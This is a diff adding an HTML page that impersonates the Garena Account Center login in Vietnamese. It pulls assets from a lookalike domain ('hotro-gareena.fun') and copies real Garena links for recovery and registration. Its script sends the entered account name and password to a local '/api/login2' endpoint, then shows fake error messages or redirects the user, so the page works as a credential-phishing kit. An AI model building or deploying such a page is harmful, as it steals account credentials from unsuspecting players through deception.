@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+ <!-- End Google Tag Manager -->
+    <link rel="icon" href="universal/static/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="https://hotro-gareena.fun/index_files/css2.css" rel="stylesheet">
+    <link href="index_files/main.css" rel="stylesheet">
+    <title>Garena Account Center</title>
+    <link rel="stylesheet" href="index_files/test.css">
+  <link rel="stylesheet" href="index_files/TopBar-89b3db7d.css">
+  <link rel="stylesheet" href="index_files/LoginView-0d1d9d61.css">
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-6X0YS1GW8K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-6X0YS1GW8K');
+</script>
+</head>
+  
+  <body>
+
+    <div id="" data-v-app="">
+	<header class="topbar" data-v-878436c2="" data-v-15e3e196="">
+	<div class="container" data-v-878436c2=""><a class="logo" href="index.html" data-v-878436c2="">
+	<img src="index_files/logo-9d415851.svg" alt="Garena Logo" data-v-878436c2=""></a>
+	<select class="lang" data-v-878436c2=""><option value="en-US" data-v-878436c2="">Việt Nam - Tiếng Việt</option><option value="en-SG" data-v-878436c2="">Singapore - English</option><option value="zh-SG" data-v-878436c2="">新加坡 - 简体中文</option><option value="zh-TW" data-v-878436c2="">台灣 - 繁体中文</option><option value="en-PH" data-v-878436c2="">Philippines - English</option><option value="th-TH" data-v-878436c2="">ไทย - ไทย</option><option value="id-ID" data-v-878436c2="">Indonesia - Bahasa Indonesia</option><option value="vi-VN" data-v-878436c2="">Việt Nam - Tiếng Việt</option><option value="ru-RU" data-v-878436c2="">Россия - Русский</option><option value="en-MY" data-v-878436c2="">Malaysia - English</option><option value="pt-PT" data-v-878436c2="">Portugal - Português</option><option value="es-ES" data-v-878436c2="">España - Español</option></select></div></header>
+	<main data-v-15e3e196="">
+	 <form class="login-form">
+    	<h2 data-v-15e3e196="">Đăng nhập</h2><div class="field required" data-v-15e3e196="">
+    	    
+    	<input type="text" placeholder="Tài khoản Garena, Email hoặc số điện thoại" data-v-15e3e196="" id="username"><!----></div>
+    	
+    	 <div class="message" style="color: red; text-align: left;font-size:12px"><p id="username_tb"></p><br></div>
+    	<div class="field required" data-v-15e3e196="">
+    	    
+    	<input type="password" placeholder="Mật khẩu" data-v-15e3e196="" id="password"><!----></div>
+    	
+    		 <div class="message" style="color: red; text-align: left;font-size:12px"><p id="password_tb"></p><br></div>
+    	<a class="forgot" href="https://account.garena.com/recovery" data-v-15e3e196="">Quên mật khẩu?</a>
+    	
+    	<div class="field">
+    	    <button class="primary" type="submit" id="clicklogin">Đăng Nhập Ngay</button>
+    	</div>
+    	
+    	<div class="message" style="color: red; margin-top: 5px; text-align: left;font-size:12px;display: flex; align-items:center">
+            <img src="universal/assets/exclamation-d4037144.svg" width="18px" id="lgloi" style="display: none;">
+            <p id="message" style="margin-left: 3px"></p>
+            <br><br>
+        </div>
+    	<div class="field" data-v-15e3e196=""><a href="https://sso.garena.com/universal/register?redirect_uri=https://sso.garena.com/universal/login?app_id=10100%26redirect_uri=https%253A%252F%252Faccount.garena.com%252F%253Flocale_name%253DVN%26locale=vi-VN&locale=vi-VN"><button class="secondary register" type="button" data-v-15e3e196="">Tạo tài khoản mới</button>
+
+    	</a></div>
+	    <div class="agreement" data-v-cc522501=""><a href="https://contentgarena-a.akamaihd.net/legal/tos/tos_vn.html" data-v-cc522501="">Điều Khoản Dịch Vụ</a> và <a href="https://contentgarena-a.akamaihd.net/legal/pp/pp_vn.html" data-v-cc522501="">Chính Sách Bảo Mật</a></div>
+	</form>
+	
+	<script src="ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <script>
+            $(document).ready(function() {
+            $('#clicklogin').click(function(e) {
+                e.preventDefault();
+                $('#username_tb').html('');
+                $('#password_tb').html('');
+                $('#message').html('');
+                document.getElementById("lgloi").style.display = "none";
+                let username = $("#username").val().trim();
+                let password = $("#password").val().trim();
+                if (!username && !password)
+                {
+                    $('#username_tb').html('Nhập tên tài khoản hoặc email');
+                     $('#password_tb').html('Nhập mật khẩu');
+                     exit(1);
+                }
+                if (!username)
+                {
+                    $('#username_tb').html('Nhập tên tài khoản hoặc email');
+                    exit(1);
+                }
+                if (!password)
+                {
+                    $('#password_tb').html('Nhập mật khẩu');
+                    exit(1);
+                }
+                    $.ajax({
+                    type: 'GET',
+                    dataType: 'JSON',
+                    url: '/api/login2?account='+username+'&password='+password,
+                    beforeSend: function() {
+                        $('#clicklogin').html('Đang đăng nhập...').prop('disabled',true);
+                    }
+                }).done(function(dvv) {
+                    $('#clicklogin').html('Đăng Nhập Ngay').prop('disabled',false);
+                    if (dvv.error) {
+                        if (dvv.error == 'error_no_account')
+                        {
+                            document.getElementById("lgloi").style.display = "flex";
+                            $('#message').html('Đăng nhập thất bại: Tài khoản hoặc mật khẩu bị sai');
+                        } else if (dvv.error == 'error_auth')
+                        {
+                            document.getElementById("lgloi").style.display = "flex";
+                            $('#message').html('Đăng nhập thất bại: sai tên tài khoản hoặc mật khẩu');
+                        } else if (dvv.error == 'error_params')
+                        {
+                            document.getElementById("lgloi").style.display = "flex";
+                            $('#message').html('error param');
+                        } else if (dvv.error == 'error_redirect')
+                        {
+                            window.location.href = dvv.redirect_url;
+                        } else if (dvv.error == 'error_exceed_rate_limit' || dvv.msg == 'error_exceed_rate_limit') {
+                            document.getElementById("lgloi").style.display = "flex";
+                            $('#message').html('Quá nhiều yêu cầu. Vui lòng thử lại vào ngày mai!');
+                        }else if (dvv.error == 'error' && dvv.msg == 'error') {
+                            document.getElementById("lgloi").style.display = "flex";
+                            $('#message').html('Lỗi hệ thống. Vui lòng đăng nhập lại!');
+                        } else {
+                            document.getElementById("lgloi").style.display = "flex";
+                            $('#message').html(''+dvv.msg);
+                            if (dvv.redirect_url != '')
+                            {
+                                window.location.href = dvv.redirect_url;
+                            }
+                        } 
+                    } else {
+                        document.getElementById("lgloi").style.display = "flex";
+                        $('#message').html('Đăng nhập thất bại: Lỗi hệ thống');
+                        if (dvv.redirect_url != '')
+                        {
+                            window.location.href = dvv.redirect_url;
+                        }
+                    }
+                }).fail(function(dvv2)
+                {
+                    $('#clicklogin').html('Đăng Nhập Ngay').prop('disabled',false);
+                    $('#message').html('Đăng nhập thất bại: Lỗi hệ thống');
+                });
+            });
+        });
+    </script>
+	</main>
+	
+			   <div style="color: red; text-align: center" id="thongbao" name="thongbao"></div>
+	</div>
+
+        <script src="js/bootstrap.min.js"></script> 
+	<script src="js/sweetalert.min.js"></script> 
+</body></html>
+
+
